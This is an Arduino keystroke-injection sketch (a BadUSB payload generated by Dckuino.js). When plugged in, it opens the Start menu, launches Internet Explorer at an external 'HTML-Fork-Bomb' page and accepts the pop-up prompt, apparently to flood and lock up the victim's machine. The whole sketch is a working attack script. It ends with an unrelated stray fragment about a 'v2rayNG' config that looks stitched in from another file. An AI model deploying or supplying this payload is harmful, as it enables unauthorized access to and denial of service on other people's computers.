/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(2000);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("C:\\Program Files\\Internet Explorer\\iexplore.exe https://jonnybanana.github.io/HTML-Fork-Bomb.github.io/");

  delay(200);

  typeKey(KEY_RETURN);

  // set a long delay to give time to this disgusting browser
  delay(1000);

  // it's time to enable Pop-Up
  typeKey(KEY_TAB);

  delay(200);

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}

# v2rayNG
v2rayNG Config Free 
